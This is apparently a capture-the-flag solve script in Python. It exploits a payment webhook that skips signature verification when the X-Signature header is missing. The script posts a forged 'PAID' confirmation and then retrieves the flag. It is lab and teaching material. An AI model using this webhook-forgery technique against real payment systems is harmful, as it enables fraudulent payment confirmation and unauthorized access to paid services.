#!/usr/bin/env python3
import re
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request

# The webhook only checks X-Signature when the header is present. Without the
# header it marks the payment PAID. The status page then shows the flag for any
# PAID payment, so a fresh vendor's payment ID is enough.


def request(url, data=None, headers=None):
    req = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.read().decode(errors="replace")
    except urllib.error.HTTPError as err:
        return err.read().decode(errors="replace")


def exploit(host, port):
    base = f"http://{host}:{port}"

    email = f"solve{secrets.token_hex(4)}@example.com"
    form = urllib.parse.urlencode({"name": "solve", "email": email, "password": "Passw0rd!"}).encode()
    page = request(f"{base}/vendor/register", data=form)
    payment = re.search(r"pay_[0-9a-f]+", page)
    if not payment:
        raise RuntimeError("payment ID not found on vendor page")
    print(f"[*] Vendor registered, payment {payment.group(0)}")

    # No X-Signature header, so the signature check is skipped.
    body = (
        '{"event":"payment.confirmed","status":"PAID",'
        f'"paymentId":"{payment.group(0)}","confirmationRef":"solve"}}'
    ).encode()
    print(f"[*] Webhook: {request(f'{base}/webhooks/payment/confirm', data=body, headers={'Content-Type': 'application/json'})}")

    status = request(f"{base}/vendor/payment/status?paymentId={payment.group(0)}")
    flag = re.search(r"HTB\{[^}]*\}", status)
    if not flag:
        raise RuntimeError("flag not found on payment status page")
    print(f"[+] Flag:\n{flag.group(0)}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
